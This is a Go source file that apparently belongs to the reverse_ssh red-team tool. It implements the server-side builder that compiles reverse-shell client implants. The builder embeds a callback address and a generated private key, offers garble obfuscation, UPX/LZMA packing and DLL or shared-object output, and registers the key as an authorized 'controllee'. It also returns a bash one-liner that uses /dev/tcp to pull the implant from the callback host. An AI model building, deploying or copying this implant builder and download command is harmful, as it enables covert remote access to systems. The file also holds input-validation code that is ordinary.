package webserver

import (
	"bytes"
	"encoding/base64"
	"errors"
	"fmt"
	"net"
	"os"
	"os/exec"
	"path/filepath"
	"regexp"
	"runtime"
	"strconv"
	"strings"

	"github.com/NHAS/reverse_ssh/internal"
	"github.com/NHAS/reverse_ssh/internal/server/data"
	"github.com/NHAS/reverse_ssh/pkg/logger"
	"github.com/NHAS/reverse_ssh/pkg/trie"
	"golang.org/x/crypto/ssh"
)

var (
	Autocomplete = trie.NewTrie()

	cachePath string

	validPlatforms = make(map[string]bool)
	validArchs     = make(map[string]bool)

	validArtifactName     = regexp.MustCompile(`^[A-Za-z0-9._-]{1,128}$`)
	validWorkingDirectory = regexp.MustCompile(`^[A-Za-z0-9_./~:@+\\ -]{1,255}$`)
	singleTokenBuildValue = regexp.MustCompile(`^[^\s\x00-\x1f\x7f]+$`)
)

type BuildConfig struct {
	Name, Comment, Owners string

	GOOS, GOARCH, GOARM string

	ConnectBackAdress, Fingerprint string

	Proxy, SNI, LogLevel string

	UseKerberosAuth bool

	SharedLibrary bool
	UPX           bool
	Lzma          bool
	Garble        bool
	DisableLibC   bool
	RawDownload   bool
	UseHostHeader bool

	WorkingDirectory string

	NTLMProxyCreds string

	VersionString string
}

func Build(config BuildConfig) (string, error) {
	if !webserverOn {
		return "", errors.New("web server is not enabled")
	}
	if err := validateBuildConfig(config); err != nil {
		return "", err
	}

	if len(config.GOARCH) != 0 && !validArchs[config.GOARCH] {
		return "", fmt.Errorf("GOARCH supplied is not valid: %s", config.GOARCH)
	}

	if len(config.GOOS) != 0 && !validPlatforms[config.GOOS] {
		return "", fmt.Errorf("GOOS supplied is not valid: %s", config.GOOS)
	}

	if len(config.Fingerprint) == 0 {
		config.Fingerprint = defaultFingerPrint
	}

	if config.UPX {
		_, err := exec.LookPath("upx")
		if err != nil {
			return "", errors.New("upx could not be found in PATH")
		}
	}

	buildTool := "go"
	if config.Garble {
		_, err := exec.LookPath("garble")
		if err != nil {
			return "", errors.New("garble could not be found in PATH")
		}
		buildTool = "garble"
	}

	var f data.Download
	f.WorkingDirectory = config.WorkingDirectory
	f.CallbackAddress = config.ConnectBackAdress
	f.UseHostHeader = config.UseHostHeader

	filename, err := internal.RandomString(16)
	if err != nil {
		return "", err
	}

	if len(config.Name) == 0 {
		config.Name, err = internal.RandomString(16)
		if err != nil {
			return "", err
		}
	}

	f.Goos = runtime.GOOS
	if len(config.GOOS) > 0 {
		f.Goos = config.GOOS
	}

	f.Goarch = runtime.GOARCH
	if len(config.GOARCH) > 0 {
		f.Goarch = config.GOARCH
	}

	f.Goarm = config.GOARM

	f.FilePath = filepath.Join(cachePath, filename)
	f.FileType = "executable"
	f.Version = internal.Version + "_guess"

	repoVersion, err := exec.Command("git", "describe", "--tags").CombinedOutput()
	if err == nil {
		f.Version = string(repoVersion)
	}

	var buildArguments []string
	if config.Garble {
		buildArguments = append(buildArguments, "-tiny", "-literals")
	}

	buildArguments = append(buildArguments, "build", "-trimpath")

	if config.SharedLibrary {
		buildArguments = append(buildArguments, "-buildmode=c-shared")
		buildArguments = append(buildArguments, "-tags=cshared")
		f.FileType = "shared-object"
		if f.Goos != "windows" {
			f.FilePath += ".so"
		} else {
			f.FilePath += ".dll"
		}

	}

	newPrivateKey, err := internal.GeneratePrivateKey()
	if err != nil {
		return "", err
	}

	sshPriv, err := ssh.ParsePrivateKey(newPrivateKey)
	if err != nil {
		return "", err
	}
	lastBuiltClientStableID = internal.FingerprintSHA1Hex(sshPriv.PublicKey())

	publicKeyBytes := ssh.MarshalAuthorizedKey(sshPriv.PublicKey())
	embeddedPrivateKeyB64 := base64.StdEncoding.EncodeToString(newPrivateKey)

	_, err = logger.StrToUrgency(config.LogLevel)
	if err != nil {
		return "", err
	}

	buildArguments = append(buildArguments, fmt.Sprintf("-ldflags=-s -w -X main.logLevel=%s -X main.destination=%s -X main.fingerprint=%s -X main.proxy=%s -X main.customSNI=%s -X main.useHostKerberos=%t -X main.ntlmProxyCreds=%s -X main.versionString=%s -X github.com/NHAS/reverse_ssh/internal.Version=%s -X github.com/NHAS/reverse_ssh/internal/client/keys.EmbeddedPrivateKeyBase64=%s", config.LogLevel, config.ConnectBackAdress, config.Fingerprint, config.Proxy, config.SNI, config.UseKerberosAuth, config.NTLMProxyCreds, strings.TrimSpace(config.VersionString), strings.TrimSpace(f.Version), embeddedPrivateKeyB64))
	buildArguments = append(buildArguments, "-o", f.FilePath, filepath.Join(projectRoot, "/cmd/client"))

	cmd := exec.Command(buildTool, buildArguments...)

	if config.DisableLibC {
		cmd.Env = append(os.Environ(), "CGO_ENABLED=0")
	}

	cmd.Env = append(cmd.Env, os.Environ()...)
	cmd.Env = append(cmd.Env, "GOTOOLCHAIN=go1.24.5+auto")
	cmd.Env = append(cmd.Env, "GOOS="+f.Goos)
	cmd.Env = append(cmd.Env, "GOARCH="+f.Goarch)
	if len(f.Goarm) != 0 {
		cmd.Env = append(cmd.Env, "GOARM="+f.Goarm)
	}

	//Building a shared object for windows needs some extra beans
	cgoOn := "0"
	if config.SharedLibrary {

		var crossCompiler string
		if (runtime.GOOS == "linux" || runtime.GOOS == "darwin") && f.Goos == "windows" {
			crossCompiler = "x86_64-w64-mingw32-gcc"
			if f.Goarch == "386" {
				crossCompiler = "i686-w64-mingw32-gcc"
			}
		}

		cmd.Env = append(cmd.Env, "CC="+crossCompiler)
		cgoOn = "1"
	}

	cmd.Env = append(cmd.Env, "CGO_ENABLED="+cgoOn)

	output, err := cmd.CombinedOutput()
	if err != nil {
		if strings.Contains(err.Error(), "garble") && (strings.Contains(err.Error(), "i686-w64-mingw32-ld") || strings.Contains(err.Error(), "x86_64-w64-mingw32-ld")) &&
			strings.Contains(err.Error(), "undefined reference to") {
			// Try to recover if the linking fails by clearing the cache
			if cleanErr := exec.Command("go", "clean", "-cache").Run(); cleanErr != nil {
				return "", fmt.Errorf("error (was unable to automatically clean cache): %s\n%s", err.Error(), string(output))
			}
			output, err = cmd.CombinedOutput()
			if err != nil {
				return "", fmt.Errorf("error: %s\n%s", err.Error(), string(output))
			}
		} else {
			return "", fmt.Errorf("error: %s\n%s", err.Error(), string(output))
		}
	}

	f.UrlPath = config.Name

	if config.Lzma && !config.UPX {
		return "", errors.New("Cannot use --lzma without --upx")
	}

	if config.UPX {
		upxArgs := []string{"-qq", "-f", f.FilePath}

		if config.Lzma {
			upxArgs = append([]string{"--lzma"}, upxArgs...)
		}

		output, err := exec.Command("upx", upxArgs...).CombinedOutput()
		if err != nil {
			return "", errors.New("unable to run upx: " + err.Error() + ": " + string(output))
		}
	}

	fi, err := os.Stat(f.FilePath)
	if err != nil {
		fmt.Println("Error: ", err)
	}
	f.FileSize = float64(fi.Size()) / 1024 / 1024

	os.Chmod(f.FilePath, 0600)

	f.LogLevel = config.LogLevel

	err = data.CreateDownload(f)
	if err != nil {
		return "", err
	}

	Autocomplete.Add(config.Name)

	authorizedControlleeKeys, err := os.OpenFile(filepath.Join(cachePath, "../authorized_controllee_keys"), os.O_APPEND|os.O_WRONLY|os.O_CREATE, 0600)
	if err != nil {
		return "", errors.New("cant open authorized controllee keys file: " + err.Error())
	}
	defer authorizedControlleeKeys.Close()

	if _, err = authorizedControlleeKeys.WriteString(fmt.Sprintf("%s %s %s\n", "owner="+strconv.Quote(config.Owners), publicKeyBytes[:len(publicKeyBytes)-1], config.Comment)); err != nil {
		return "", errors.New("cant write newly generated key to authorized controllee keys file: " + err.Error())
	}

	if config.RawDownload {

		host, port, err := net.SplitHostPort(f.CallbackAddress)
		if err != nil {
			return fmt.Sprintf(`bash -c "exec 3<>/dev/tcp/HOSTHERE/PORT_HERE; echo RAW%[1]s>&3; cat <&3" > %[1]s`, config.Name), nil
		}

		return fmt.Sprintf(`bash -c "exec 3<>/dev/tcp/%s/%s; echo RAW%[3]s>&3; cat <&3" > %[3]s`, host, port, config.Name), nil
	}

	return "http://" + DefaultConnectBack + "/" + config.Name, nil
}

func startBuildManager(_cachePath string) error {

	clientSource := filepath.Join(projectRoot, "/cmd/client")
	info, err := os.Stat(clientSource)
	if err != nil || !info.IsDir() {
		return fmt.Errorf("the server doesnt appear to be in {project_root}/bin, please put it there")
	}

	cmd := exec.Command("go", "tool", "dist", "list")
	output, err := cmd.CombinedOutput()
	if err != nil {
		return fmt.Errorf("unable to run the go compiler to get a list of compilation targets: %s", err)
	}

	platformAndArch := bytes.Split(output, []byte("\n"))

	for _, line := range platformAndArch {
		parts := bytes.Split(line, []byte("/"))
		if len(parts) == 2 {
			validPlatforms[string(parts[0])] = true
			validArchs[string(parts[1])] = true
		}
	}

	info, err = os.Stat(_cachePath)
	if os.IsNotExist(err) {
		err = os.Mkdir(_cachePath, 0700)
		if err != nil {
			return err
		}
		info, err = os.Stat(_cachePath)
		if err != nil {
			return err
		}
	}

	if !info.IsDir() {
		return errors.New("Filestore path '" + _cachePath + "' already exists, but is a file instead of directory")
	}

	cachePath = _cachePath

	return nil
}

func validateBuildConfig(config BuildConfig) error {
	config.Name = strings.TrimSpace(config.Name)
	config.Comment = strings.TrimSpace(config.Comment)
	config.Owners = strings.TrimSpace(config.Owners)
	config.Proxy = strings.TrimSpace(config.Proxy)
	config.SNI = strings.TrimSpace(config.SNI)
	config.ConnectBackAdress = strings.TrimSpace(config.ConnectBackAdress)
	config.NTLMProxyCreds = strings.TrimSpace(config.NTLMProxyCreds)
	config.VersionString = strings.TrimSpace(config.VersionString)
	config.WorkingDirectory = strings.TrimSpace(config.WorkingDirectory)

	if config.Name != "" && !validArtifactName.MatchString(config.Name) {
		return errors.New("artifact name may only contain letters, numbers, '.', '_' and '-'")
	}
	if hasControlCharacters(config.Comment) {
		return errors.New("artifact comment must be a single line without control characters")
	}
	if hasControlCharacters(config.Owners) {
		return errors.New("artifact owners must not contain control characters")
	}
	if config.WorkingDirectory != "" && !validWorkingDirectory.MatchString(config.WorkingDirectory) {
		return errors.New("working directory contains unsupported characters")
	}
	for field, value := range map[string]string{
		"callback address": config.ConnectBackAdress,
		"proxy":            config.Proxy,
		"sni":              config.SNI,
		"ntlm proxy creds": config.NTLMProxyCreds,
		"version string":   config.VersionString,
		"log level":        config.LogLevel,
		"fingerprint":      config.Fingerprint,
	} {
		if value == "" {
			continue
		}
		if !singleTokenBuildValue.MatchString(value) {
			return fmt.Errorf("%s must not contain spaces or control characters", field)
		}
	}
	return nil
}

func hasControlCharacters(value string) bool {
	for _, r := range value {
		if r < 32 || r == 127 {
			return true
		}
	}
	return false
}
